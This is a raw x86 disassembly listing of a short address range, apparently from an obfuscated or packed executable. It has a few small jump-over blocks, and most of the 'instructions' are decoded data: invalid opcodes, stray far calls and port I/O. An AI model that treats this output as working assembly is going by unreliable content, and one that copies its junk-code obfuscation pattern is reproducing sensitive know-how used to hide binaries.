  40b368:	add    BYTE PTR [ebx+0x36e9d055],cl
  40b36e:	pop    es
  40b36f:	add    BYTE PTR [eax],al
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	and    DWORD PTR [esi],eax
  40b3b3:	mov    cl,0x6e
  40b3b5:	popa   
  40b3b6:	cli    
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b35e
  40b3be:	push   edx
  40b3bf:	push   edi
  40b3c0:	nop
  40b3c1:	sbb    ecx,edi
  40b3c3:	fwait
  40b3c4:	pop    esp
  40b3c5:	jae    0x40b439
  40b3c7:	and    bh,ah
  40b3c9:	xchg   edi,eax
  40b3ca:	cmc    
  40b3cb:	enter  0xd9d0,0x18
  40b3cf:	or     cl,ah
  40b3d1:	in     al,dx
  40b3d2:	xor    al,0x9e
  40b3d4:	cwde   
  40b3d5:	lahf   
  40b3d6:	inc    ecx
  40b3d7:	js     0x40b380
  40b3d9:	jmp    0x40b426
  40b3db:	dec    edx
  40b3dc:	gs mov ebx,0x631abf9e
  40b3e2:	or     BYTE PTR gs:[esi+0xe],dh
  40b3e6:	inc    ecx
  40b3e7:	jl     0x40b3e1
  40b3e9:	xor    al,ah
  40b3eb:	ins    DWORD PTR es:[edi],dx
  40b3ec:	xchg   ebx,eax
  40b3ed:	mov    eax,ds:0x7fc813ff
  40b3f2:	inc    esp
  40b3f3:	push   ss
  40b3f4:	jge    0x40b440
  40b3f6:	xor    al,0x3e
  40b3f8:	push   ebx
  40b3f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3fa:	mov    ebp,0x3699009a
  40b3ff:	push   es
  40b400:	xchg   ebx,eax
  40b401:	jg     0x40b3eb
  40b403:	and    esp,esi
  40b405:	mov    ecx,0xbc30c78d
  40b40a:	inc    ecx
  40b40b:	push   edx
  40b40c:	adc    DWORD PTR [edx-0x47],ebx
  40b40f:	dec    ecx
  40b410:	sbb    DWORD PTR [ebx],esp
  40b412:	daa    
  40b413:	pop    edi
  40b414:	lods   eax,DWORD PTR ds:[esi]
  40b415:	fstp   TBYTE PTR [edx+0xffb96c1]
  40b41b:	pop    ebp
  40b41c:	mov    dh,0x85
  40b41e:	fs cwde 
  40b420:	cmp    al,0x9a
  40b422:	sub    cl,bh
  40b424:	sub    al,ah
  40b426:	mov    edx,0x1c84e3a2
  40b42b:	jno    0x40b40c
  40b42d:	outs   dx,DWORD PTR ds:[esi]
  40b42e:	xor    dl,0x79
  40b431:	push   0x45
  40b433:	(bad)  
  40b434:	and    al,0x85
  40b436:	scas   eax,DWORD PTR es:[edi]
  40b437:	enter  0x282e,0xe3
  40b43b:	and    BYTE PTR [ecx],dh
  40b43d:	imul   edx,DWORD PTR [edi-0x59],0x6d1ca08
  40b444:	dec    edi
  40b445:	jle    0x40b483
  40b447:	(bad)  
  40b448:	shl    DWORD PTR [edx],1
  40b44a:	jp     0x40b460
  40b44c:	xchg   esp,eax
  40b44d:	rcr    DWORD PTR [ebp+0x7],0x86
  40b451:	jo     0x40b3d3
  40b453:	fadd   DWORD PTR [eax+edx*2]
  40b456:	push   ebx
  40b457:	sub    DWORD PTR [eax+0x5e],eax
  40b45a:	retf   0x8b2e
  40b45d:	idiv   BYTE PTR [edi+0x12]
  40b460:	and    ebx,DWORD PTR [esi-0x4d633a6c]
  40b466:	ret    0xb6ed
  40b469:	rcr    DWORD PTR [esi-0x5c],1
  40b46c:	out    0xe0,al
  40b46e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b46f:	(bad)  
  40b470:	push   esi
  40b471:	scas   al,BYTE PTR es:[edi]
  40b472:	ja     0x40b4c8
  40b474:	inc    esi
  40b475:	jecxz  0x40b4f6
  40b477:	test   al,0x2a
  40b479:	arpl   WORD PTR [edx+0x6],dx
  40b47c:	clc    
  40b47d:	add    edi,DWORD PTR [edx-0x504f6f7f]
  40b483:	add    bl,BYTE PTR [ebp+0x4d]
  40b486:	pop    ebp
  40b487:	ror    DWORD PTR [ebx-0x28],cl
  40b48a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b48b:	push   edx
  40b48c:	pop    ds
  40b48d:	push   0x8
  40b48f:	test   dl,bh
  40b491:	or     al,0x20
  40b493:	sbb    al,0x57
  40b495:	inc    ebx
  40b496:	or     ecx,DWORD PTR [esi-0x43176c41]
  40b49c:	jb     0x40b4dd
  40b49e:	das    
  40b49f:	test   DWORD PTR [eax],esp
  40b4a1:	call   0x3fc2:0xea0f154e
  40b4a8:	fwait
  40b4a9:	sub    al,0x3a
  40b4ab:	pop    eax
  40b4ac:	mov    ebp,0x34f283d1
  40b4b1:	pop    esi
  40b4b2:	mov    al,0x84
  40b4b4:	fstp   QWORD PTR [ebx+0x22c934bd]
  40b4ba:	cs (bad) 
  40b4bc:	xor    eax,0xedd62861
  40b4c1:	stc    
  40b4c2:	xchg   edx,eax
  40b4c3:	adc    eax,0x228a16f7
  40b4c8:	mov    ds:0x195625aa,al
  40b4cd:	out    0x4b,al
  40b4cf:	inc    ebp
  40b4d0:	(bad)  [ebx]
  40b4d2:	not    DWORD PTR [eax-0x54]
  40b4d5:	ret    0x9d47
  40b4d8:	sub    DWORD PTR [eax+0x78],0xa2688309
  40b4df:	push   ebp
  40b4e0:	adc    edx,eax
  40b4e2:	out    dx,eax
  40b4e3:	mov    cl,0x9
  40b4e5:	cmp    ebx,DWORD PTR [eax+0x70]
  40b4e8:	clc    
  40b4e9:	gs jnp 0x40b4ac
  40b4ec:	pop    ebx
  40b4ed:	jle    0x40b50d
  40b4ef:	scas   eax,DWORD PTR es:[edi]
  40b4f0:	sbb    eax,0x774d8db1
  40b4f5:	(bad)  
  40b4f6:	std    
  40b4f7:	inc    eax
  40b4f8:	hlt    
  40b4f9:	jmp    0xb675:0x802350c6
  40b500:	test   eax,0xf75851c6
  40b505:	in     eax,0xa8
  40b507:	pop    esi
  40b508:	test   BYTE PTR [edi-0x35],dh
  40b50b:	jae    0x40b4ec
  40b50d:	sti    
  40b50e:	repnz icebp 
  40b510:	mov    DWORD PTR ds:0xaa89a485,esi
  40b516:	mov    ecx,0xd3cf0f3a
  40b51b:	ffree  st(2)
  40b51d:	repz in eax,dx
  40b51f:	repz and dl,dl
  40b522:	imul   edx,edx,0x5a
  40b525:	pusha  
  40b526:	out    0x13,eax
  40b528:	hlt    
  40b529:	mov    esp,0x386124a7
  40b52e:	xor    eax,0x2c
  40b531:	adc    DWORD PTR [eax],edx
  40b533:	loope  0x40b59a
  40b535:	loop   0x40b52a
  40b537:	out    dx,eax
  40b538:	cmp    BYTE PTR [edi+eax*2-0x3d],bh
  40b53c:	ds xor al,0x15
  40b53f:	xchg   ebx,eax
  40b540:	or     edx,DWORD PTR [edx]
  40b542:	out    dx,eax
  40b543:	dec    edx
  40b544:	xchg   edi,eax
  40b545:	fcom   QWORD PTR [edx+edi*8]
  40b548:	imul   DWORD PTR [ebx+0x32]
  40b54b:	adc    ebp,DWORD PTR [ecx+0x4115f141]
  40b551:	xchg   BYTE PTR [esi],dl
  40b553:	push   0xffffffe7
  40b555:	rcr    ebp,cl
  40b557:	fild   WORD PTR [ebx+0x4d]
  40b55a:	iret   
  40b55b:	xor    cl,al
  40b55d:	call   0x38ee:0xe4cf8480
  40b564:	cwde   
  40b565:	xcrypt-ofb (bad)
  40b566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b567:	test   al,0x6d
  40b569:	add    BYTE PTR [edx-0x17],dh
  40b56c:	lahf   
  40b56d:	(bad)  
  40b56e:	lods   al,BYTE PTR ds:[esi]
  40b56f:	sub    al,0x99
  40b571:	jb     0x40b4fb
  40b573:	call   0xa3ec5641
  40b578:	or     eax,0x35be0cca
  40b57d:	jns    0x40b5ad
  40b57f:	cmp    eax,0x51a6e09e
  40b584:	dec    ebp
  40b585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b586:	jmp    0x40b52c
  40b588:	cmp    esi,ebp
  40b58a:	and    edx,eax
  40b58c:	push   0x5
  40b58e:	push   ds
  40b58f:	push   ds
  40b590:	lds    ebx,FWORD PTR [ecx]
  40b592:	(bad)  
  40b593:	in     al,dx
  40b594:	mov    eax,ds:0xe33d3620
  40b599:	out    dx,eax
  40b59a:	(bad)  
  40b59b:	aad    0x5c
  40b59d:	inc    ebx
  40b59e:	sub    al,0xd2
  40b5a0:	(bad)  
  40b5a1:	fstp   TBYTE PTR [ebp-0x7]
  40b5a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5a5:	mov    ch,0xd0
  40b5a7:	dec    ebx
  40b5a8:	mov    bl,0x5d
  40b5aa:	into   
  40b5ab:	jle    0x40b5ff
  40b5ad:	sbb    BYTE PTR [ecx+esi*2-0x2c],al
  40b5b1:	in     eax,dx
  40b5b2:	clc    
  40b5b3:	sbb    DWORD PTR [eax],ecx
  40b5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5b6:	in     eax,0xda
  40b5b8:	inc    edx
  40b5b9:	dec    ebp
  40b5ba:	mov    ebx,0x408e0a75
  40b5bf:	out    0x92,eax
  40b5c1:	sbb    edx,DWORD PTR [edi+0x16]
  40b5c4:	mov    edx,0x3f8ceb6d
  40b5c9:	imul   esp,DWORD PTR [ecx],0xffffffc5
  40b5cc:	out    0x89,eax
  40b5ce:	mov    al,ds:0xa938b07c
  40b5d3:	call   0x22d2:0x6d5216af
  40b5da:	gs test al,0xe1
  40b5dd:	mov    ds:0x90abedb0,eax
  40b5e2:	cli    
  40b5e3:	mov    dh,0xef
  40b5e5:	cld    
  40b5e6:	cmp    esp,esi
  40b5e8:	sahf   
  40b5e9:	jnp    0x40b5c7
  40b5eb:	dec    ecx
  40b5ec:	add    BYTE PTR [edi+eax*2+0x2e769d6e],dl
  40b5f3:	mov    eax,ds:0xa30b1b8b
  40b5f8:	xchg   esp,eax
  40b5f9:	adc    al,0xdd
  40b5fb:	lods   eax,DWORD PTR ds:[esi]
  40b5fc:	push   es
  40b5fd:	pop    esp
  40b5fe:	xchg   edx,eax
  40b5ff:	xor    al,0xa8
  40b601:	mov    eax,DWORD PTR [edi+0x3222dc58]
  40b607:	sbb    DWORD PTR [edi],ebx
  40b609:	nop
  40b60a:	jb     0x40b5a7
  40b60c:	test   eax,0x47014e5d
  40b611:	xor    bh,BYTE PTR [ebx]
  40b613:	push   cs
  40b614:	push   cs
  40b615:	jb     0x40b62c
  40b617:	dec    eax
  40b618:	(bad)
  40b61c:	(bad)  
  40b61d:	jne    0x40b617
  40b61f:	shr    bl,0xf2
  40b622:	dec    ecx
  40b623:	cld    
  40b624:	dec    ebp
  40b625:	pop    ds
  40b626:	mov    al,0xdf
  40b628:	sbb    edx,DWORD PTR [esi+edi*1-0x8]
  40b62c:	dec    DWORD PTR es:[edi-0x8]
  40b630:	or     esi,0xbb988076
  40b636:	sub    eax,0xcca5b41c
  40b63b:	pop    ds
  40b63c:	push   es
  40b63d:	jp     0x40b678
  40b63f:	test   eax,0xe833a83e
  40b644:	leave  
  40b645:	pop    esi
  40b646:	inc    edx
  40b647:	int    0x9f
  40b649:	pop    edi
  40b64a:	enter  0x7510,0x54
  40b64e:	xchg   ecx,eax
  40b64f:	mov    ecx,0x2c915040
  40b654:	div    BYTE PTR [edi]
  40b656:	imul   edx,DWORD PTR [eax-0x6c],0x4
  40b65a:	fistp  QWORD PTR [ecx]
  40b65c:	rcl    BYTE PTR [ebx+edx*8],1
  40b65f:	fiadd  WORD PTR [ecx+0x60]
  40b662:	pusha  
  40b663:	hlt    
  40b664:	mov    bl,0xb5
  40b666:	mov    bl,0x0
  40b668:	and    al,0x40
  40b66a:	fcmove st,st(5)
  40b66c:	inc    ebx
  40b66d:	loopne 0x40b618
  40b66f:	sub    DWORD PTR [edx+0x12],0x4a
  40b673:	fstp   QWORD PTR [ebx-0x1230db70]
  40b679:	dec    ecx
  40b67a:	inc    edx
  40b67b:	leave  
  40b67c:	test   al,0xe9
  40b67e:	inc    esp
  40b67f:	push   esp
  40b680:	out    0x8b,al
  40b682:	outs   dx,DWORD PTR ds:[esi]
  40b683:	ja     0x40b6ab
  40b685:	and    al,0x7e
  40b687:	jg     0x40b640
  40b689:	push   ss
  40b68a:	mov    BYTE PTR [edx+eax*2+0x50],bl
  40b68e:	xor    bl,BYTE PTR [edx+0x1b47cbae]
  40b694:	xor    bh,BYTE PTR [ebp-0x25]
  40b697:	xor    bl,ch
  40b699:	fimul  DWORD PTR [ebx]
  40b69b:	fwait
  40b69c:	xor    eax,0x157819a0
  40b6a1:	daa    
  40b6a2:	add    ecx,esi
  40b6a4:	mov    eax,0xfd307de4
  40b6a9:	es sub ah,bh
  40b6ac:	popf   
  40b6ad:	mov    ds:0xf2ec3a66,al
  40b6b2:	xchg   edx,eax
  40b6b3:	stc    
  40b6b4:	hlt    
  40b6b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6b6:	shr    BYTE PTR [edx+0x56],cl
  40b6b9:	inc    esp
  40b6ba:	mov    ds:0x43091503,eax
  40b6bf:	cmp    bh,BYTE PTR [edx+0x1924c92]
  40b6c5:	xchg   esp,eax
  40b6c6:	mov    al,ds:0xb601bf4
  40b6cb:	call   0x8259:0xa9f74299
  40b6d2:	add    bh,al
  40b6d4:	xor    BYTE PTR [ecx+ebp*4-0x59335978],cl
  40b6db:	fmul   DWORD PTR [esp+ebp*2+0x3eab816d]
  40b6e2:	and    DWORD PTR [ebx],ecx
  40b6e4:	dec    ebx
  40b6e5:	push   ebp
  40b6e6:	sub    dh,BYTE PTR [edx+0x7c]
  40b6e9:	or     bh,BYTE PTR [ebx+0xe]
  40b6ec:	leave  
  40b6ed:	sub    eax,0xa66f9dde
  40b6f2:	pop    ebp
  40b6f3:	xchg   edi,eax
  40b6f4:	push   cs
  40b6f5:	aaa    
  40b6f6:	jb     0x40b6ae
  40b6f8:	sti    
  40b6f9:	push   ss
  40b6fa:	pop    edi
  40b6fb:	dec    ebx
  40b6fc:	xchg   ebp,eax
  40b6fd:	ins    DWORD PTR es:[edi],dx
  40b6fe:	test   DWORD PTR [ebx-0x2b0ad2ba],ecx
  40b704:	popa   
  40b705:	sbb    al,BYTE PTR [ecx-0x17]
  40b708:	cmp    eax,0x7ea79dae
  40b70d:	scas   al,BYTE PTR es:[edi]
  40b70e:	mov    ecx,0xebfea268
  40b713:	xor    edx,eax
  40b715:	xor    edi,eax
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b7bf
  40b743:	jg     0x40b78f
  40b745:	mov    ah,0x3f
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b746
  40b74f:	mov    eax,0x960036fe
  40b754:	xor    BYTE PTR [edx],dh
  40b756:	push   eax
  40b757:	rol    DWORD PTR [esi],cl
  40b759:	push   0x55b48845
  40b75e:	loope  0x40b6e3
  40b760:	int    0x5
  40b762:	loop   0x40b7b5
  40b764:	lock pop ds
  40b766:	pop    ecx
  40b767:	not    DWORD PTR [ebx-0x4e]
  40b76a:	test   BYTE PTR gs:[edx],dh
  40b76d:	inc    BYTE PTR [ebx-0xa18cb6f]
  40b773:	shr    DWORD PTR [esi],1
  40b775:	retf   
  40b776:	pop    ebp
  40b777:	mov    ah,0x98
  40b779:	mov    bh,0x7b
  40b77b:	cmp    cl,BYTE PTR [edx-0x70]
  40b77e:	enter  0x3f97,0xe
  40b782:	inc    ebx
  40b783:	cmp    ah,BYTE PTR [esi]
  40b785:	xchg   esp,eax
  40b786:	dec    esi
  40b787:	bound  ebx,QWORD PTR [edi]
  40b789:	and    DWORD PTR [edx+0x33],edi
  40b78c:	in     al,dx
  40b78d:	inc    ebp
  40b78e:	push   ds
  40b78f:	call   0x653a:0x344ecc3b
  40b796:	sub    eax,0x4e3b0368
  40b79b:	fs xchg esi,eax
  40b79d:	imul   eax,DWORD PTR [ebx-0x49],0x33
  40b7a1:	sub    BYTE PTR [eax-0x3755b454],dh
  40b7a7:	outs   dx,BYTE PTR ds:[esi]
  40b7a8:	sub    eax,0x3626a03d
  40b7ad:	int3   
  40b7ae:	fstp   DWORD PTR [eax]
  40b7b0:	add    BYTE PTR [ebx-0x72],dl
  40b7b3:	stos   DWORD PTR es:[edi],eax
  40b7b4:	add    al,0xa
  40b7b6:	sahf   
  40b7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7b8:	adc    ah,al
  40b7ba:	mov    ecx,fs
  40b7bc:	aam    0x3f
  40b7be:	pop    edi
  40b7bf:	inc    ecx
  40b7c0:	out    dx,eax
  40b7c1:	adc    ch,BYTE PTR [esi]
  40b7c3:	inc    eax
  40b7c4:	pop    ds
  40b7c5:	lods   al,BYTE PTR ds:[esi]
  40b7c6:	je     0x40b79e
  40b7c8:	aaa    
  40b7c9:	lods   al,BYTE PTR ds:[esi]
  40b7ca:	aam    0xf9
  40b7cc:	inc    esi
  40b7cd:	aaa    
  40b7ce:	test   eax,0xa2c69aca
  40b7d3:	adc    eax,ecx
  40b7d5:	mov    WORD PTR [edi+0x47a7649],ss
  40b7db:	pop    esp
  40b7dc:	out    dx,eax
  40b7dd:	or     edx,DWORD PTR [ecx]
  40b7df:	mov    edi,0xbcc9f580
  40b7e4:	add    DWORD PTR [esi],esi
  40b7e6:	lea    edi,[ebp+0x2e]
  40b7e9:	in     eax,dx
  40b7ea:	dec    ebx
  40b7eb:	cmp    bh,BYTE PTR [edi]
  40b7ed:	jge    0x40b843
  40b7ef:	xlat   BYTE PTR ds:[ebx]
  40b7f0:	jmp    0x53dd:0x270b92e1
  40b7f7:	fild   DWORD PTR [ebx]
  40b7f9:	sbb    DWORD PTR [edx-0x5a42146],ebx
  40b7ff:	push   0xffffffbf
  40b801:	lock (bad) 
  40b803:	fist   DWORD PTR [esi-0x1d]
  40b806:	lods   al,BYTE PTR ds:[esi]
  40b807:	and    al,0xbc
  40b809:	cmp    eax,0x920ec128
  40b80e:	add    eax,0xbd8edb32
  40b813:	lods   al,BYTE PTR ds:[esi]
  40b814:	popf   
  40b815:	stos   BYTE PTR es:[edi],al
  40b816:	sub    DWORD PTR [bp+si+0x64eb],ebx
  40b81b:	lahf   
  40b81c:	add    eax,DWORD PTR [ebx+0x7d590f77]
  40b822:	cmp    eax,0x14d3c9ee
  40b827:	mov    ah,0x42
  40b829:	jne    0x40b7b6
  40b82b:	in     eax,dx
  40b82c:	add    bl,dl
  40b82e:	mov    edi,0x7740dcf8
  40b833:	std    
  40b834:	imul   edi,DWORD PTR [eax+0x39fc45e2],0xffffffce
  40b83b:	out    0x66,al
  40b83d:	inc    edi
  40b83e:	ficom  WORD PTR [ecx]
  40b840:	lea    esi,[eax]
  40b842:	(bad)  
  40b843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b844:	adc    ebp,DWORD PTR [ecx+eax*8-0x20dc0862]
  40b84b:	sbb    DWORD PTR [eax+0x62],esp
  40b84e:	mov    edx,0x87a54b08
  40b853:	pushf  
  40b854:	push   ss
  40b855:	popa   
  40b856:	std    
  40b857:	clc    
  40b858:	cmp    ah,BYTE PTR [edi+esi*4]
  40b85b:	jns    0x40b8b3
  40b85d:	inc    esp
  40b85e:	mov    al,ds:0xccd7e39f
  40b863:	mov    bh,0x3a
  40b865:	jo     0x40b848
  40b867:	sbb    BYTE PTR [ecx+ebx*8-0x2cbd7a3d],dl
  40b86e:	test   al,0xda
  40b870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b871:	(bad)  
  40b872:	mov    bh,0x2a
  40b874:	call   0x7cea5b69
  40b879:	push   ss
  40b87a:	cmp    ecx,DWORD PTR [edx-0x1d]
  40b87d:	mov    DWORD PTR [edi],ecx
  40b87f:	push   edx
  40b880:	xchg   esi,eax
  40b881:	ret    0x1845
  40b884:	loop   0x40b870
  40b886:	jecxz  0x40b861
  40b888:	dec    edi
  40b889:	stos   DWORD PTR es:[edi],eax
  40b88a:	out    dx,al
  40b88b:	mov    esp,0xddd3f2d9
  40b890:	add    ecx,DWORD PTR [ecx]
  40b892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b893:	dec    ebx
  40b894:	loopne 0x40b869
  40b896:	call   0x169b5039
  40b89b:	jo     0x40b899
  40b89d:	retf   0xe91d
  40b8a0:	jo     0x40b88c
  40b8a2:	mov    esi,DWORD PTR [edx+0x3affd448]
  40b8a8:	or     BYTE PTR [edx+0x4a0eb580],al
  40b8ae:	les    ebx,FWORD PTR [esi-0x48]
  40b8b1:	pop    ebp
  40b8b2:	and    bh,dl
  40b8b4:	aad    0x45
  40b8b6:	and    al,BYTE PTR [edi-0x33]
  40b8b9:	mov    dh,0xbb
  40b8bb:	(bad)  
  40b8bc:	mov    eax,0x3b68a9ba
  40b8c1:	aaa    
  40b8c2:	add    BYTE PTR [edi-0xf],bh
  40b8c5:	dec    ecx
  40b8c6:	push   esp
  40b8c7:	dec    DWORD PTR [esp+ebx*1+0x7f7199e3]
  40b8ce:	lods   al,BYTE PTR ds:[esi]
  40b8cf:	into   
  40b8d0:	mov    bl,0x24
  40b8d2:	aas    
  40b8d3:	js     0x40b85a
  40b8d5:	call   0xb22c4e80
  40b8da:	jo     0x40b8da
  40b8dc:	fcomp  st(4)
  40b8de:	xchg   ebp,eax
  40b8df:	outs   dx,BYTE PTR ds:[esi]
  40b8e0:	repz cdq 
  40b8e2:	adc    eax,0xb18e1d01
  40b8e7:	mov    ebp,0x77c41c79
  40b8ec:	push   ebx
  40b8ed:	(bad)  
  40b8ee:	pop    esp
  40b8ef:	jmp    0x40b8d3
  40b8f1:	mov    edx,0x8a11d26a
  40b8f6:	(bad)  
  40b8f7:	xchg   ebp,eax
  40b8f8:	mov    ds:0xb73f9fa2,al
  40b8fd:	xor    al,0xa5
  40b8ff:	or     al,0x59
  40b901:	iret   
  40b902:	lods   al,BYTE PTR ds:[esi]
  40b903:	fild   QWORD PTR [ecx]
  40b905:	pop    esp
  40b906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b907:	push   esp
  40b908:	enter  0x5145,0xcf
  40b90c:	jmp    0xb3366f95
  40b911:	xchg   DWORD PTR [edx],esi
  40b913:	not    ah
  40b915:	lods   eax,DWORD PTR ds:[esi]
  40b916:	out    dx,eax
  40b917:	jl     0x40b899
  40b919:	fist   DWORD PTR [edi+ecx*8-0x40]
  40b91d:	xor    al,0xd9
  40b91f:	jp     0x40b8c0
  40b921:	or     eax,0xcb460cb0
  40b926:	pop    ecx
  40b927:	xchg   ebx,eax
  40b928:	dec    ecx
  40b929:	int3   
  40b92a:	or     ch,dl
  40b92c:	jl     0x40b8fd
  40b92e:	div    ah
  40b930:	add    eax,0xc14d817a
  40b935:	push   ss
  40b936:	out    0x83,eax
  40b938:	mov    esp,0x6c9af7c1
  40b93d:	jo     0x40b99f
  40b93f:	inc    eax
  40b940:	xlat   BYTE PTR ds:[ebx]
  40b941:	adc    ebx,DWORD PTR [ecx+eiz*8]
  40b944:	imul   BYTE PTR [eax-0x77]
  40b947:	hlt    
  40b948:	sar    DWORD PTR [edx+0x70],cl
  40b94b:	rcl    DWORD PTR [ebp+0x4e],0x5f
  40b94f:	jb     0x40b99e
  40b951:	xchg   DWORD PTR [edx-0x5150efbf],ebx
  40b957:	jmp    0x4e83:0xcc58f519
  40b95e:	retf   0xb657
  40b961:	adc    DWORD PTR [ecx+eiz*4+0x10f11027],0xf
  40b969:	data16 out dx,al
  40b96b:	fs push esi
  40b96d:	nop
  40b96e:	out    0x6a,al
  40b970:	hlt    
  40b971:	pop    ebx
  40b972:	mov    eax,ds:0x79ac016d
  40b977:	js     0x40b92c
  40b979:	adc    ebp,DWORD PTR [eax+eiz*8]
  40b97c:	out    dx,eax
  40b97d:	imul   ecx,DWORD PTR [ebp-0x50819e10],0xa3609fb5
  40b987:	aas    
  40b988:	xchg   esp,eax
  40b989:	fsubr  st(1),st
  40b98b:	lods   eax,DWORD PTR ds:[esi]
  40b98c:	jmp    0x7845:0xc8871c8d
  40b993:	test   eax,0xd9cccab0
  40b998:	add    cl,BYTE PTR [edi]
  40b99a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b99b:	jne    0x40b971
  40b99d:	pushf  
  40b99e:	jmp    0x40b9ab
  40b9a0:	mov    esi,0xc6865520
  40b9a5:	mov    dl,0x86
  40b9a7:	leave  
  40b9a8:	mov    al,0x1a
  40b9aa:	pushf  
  40b9ab:	das    
  40b9ac:	test   BYTE PTR es:[edi],bh
  40b9af:	xor    al,0xb1
  40b9b1:	adc    BYTE PTR [ebx+eax*2],0xe0
  40b9b5:	inc    edx
  40b9b6:	push   cs
  40b9b7:	mov    ah,0x3e
  40b9b9:	not    BYTE PTR [eax+0x4e8d4f1f]
  40b9bf:	jnp    0x40b958
  40b9c1:	fcomi  st,st(5)
  40b9c3:	sbb    al,0x26
  40b9c5:	clc    
  40b9c6:	xchg   esp,eax
  40b9c7:	jle    0x40ba3c
  40b9c9:	pop    es
  40b9ca:	xchg   edx,eax
  40b9cb:	or     ecx,edi
  40b9cd:	jp     0x40b972
  40b9cf:	mov    esi,0x3928ad27
  40b9d4:	(bad)  
  40b9d5:	mov    esp,0x635bea87
  40b9da:	mov    eax,ds:0x6631391a
  40b9df:	or     DWORD PTR ds:0x8e5727c0,ebx
  40b9e5:	data16 cld 
  40b9e7:	and    DWORD PTR [ecx-0x64],edi
  40b9ea:	out    dx,al
  40b9eb:	adc    ebx,DWORD PTR [edx-0x2a4e8a50]
  40b9f1:	mov    edx,0xbea81191
  40b9f6:	test   BYTE PTR [ebp+0x49],al
  40b9f9:	neg    edi
  40b9fb:	push   0x2ebbefda
  40ba00:	call   0xc34bbfbf
  40ba05:	cdq    
  40ba06:	push   edi
  40ba07:	push   ds
  40ba08:	push   es
  40ba09:	mov    ah,0xce
  40ba0b:	(bad)  
  40ba0c:	fisubr DWORD PTR [ebx+0x1d2bb7b]
  40ba12:	dec    ecx
  40ba13:	or     al,0x6d
  40ba15:	and    ebp,DWORD PTR [ebp+0x36b67bd8]
  40ba1b:	test   BYTE PTR [edi+0x40782433],0xe6
  40ba22:	stos   DWORD PTR es:[edi],eax
  40ba23:	stos   BYTE PTR es:[edi],al
  40ba24:	fadd   QWORD PTR [edi-0x31302d76]
  40ba2a:	stos   BYTE PTR es:[edi],al
  40ba2b:	push   0x1e6933b0
  40ba30:	fcom   QWORD PTR [ecx+ecx*4-0x2b277eae]
  40ba37:	sbb    esp,DWORD PTR [edx-0x2d]
  40ba3a:	aam    0xec
  40ba3c:	mov    al,0xb2
  40ba3e:	sub    BYTE PTR [edi+0x4461fe83],bh
  40ba44:	mov    dh,0x31
  40ba46:	repnz bound eax,QWORD PTR ss:[ebp+ebx*4+0x46]
  40ba4c:	xchg   ecx,eax
  40ba4d:	outs   dx,DWORD PTR ds:[esi]
  40ba4e:	dec    edx
  40ba4f:	out    0xfb,al
  40ba51:	loopne 0x40baa3
  40ba53:	out    dx,al
  40ba54:	or     esi,DWORD PTR [ebp+0x707e11dd]
  40ba5a:	mov    al,0xd
  40ba5c:	ins    DWORD PTR es:[edi],dx
  40ba5d:	xchg   esp,eax
  40ba5e:	xchg   esi,eax
  40ba5f:	jmp    0x7cfe9f37
  40ba64:	push   ebp
  40ba65:	imul   edx,DWORD PTR [eax],0x73b7b6cc
  40ba6b:	outs   dx,BYTE PTR ds:[esi]
  40ba6c:	loopne 0x40ba30
  40ba6e:	adc    DWORD PTR [ebx],eax
  40ba70:	loop   0x40ba61
  40ba72:	mov    esp,0x5dfb4608
  40ba77:	je     0x40b9fe
  40ba79:	mov    dl,0x48
  40ba7b:	or     eax,0xf27806cf
  40ba80:	cdq    
  40ba81:	mov    ecx,0xff1f7fa8
  40ba86:	fwait
  40ba87:	addr16 or esi,0x683263c1
  40ba8e:	loop   0x40ba81
  40ba90:	inc    ebx
  40ba91:	push   ebp
  40ba92:	repz ds inc ebx
  40ba95:	and    esp,DWORD PTR [eax+0x7a7ff11f]
  40ba9b:	jge    0x40ba28
  40ba9d:	or     ebp,DWORD PTR [ebp+ecx*1+0x5]
  40baa1:	icebp  
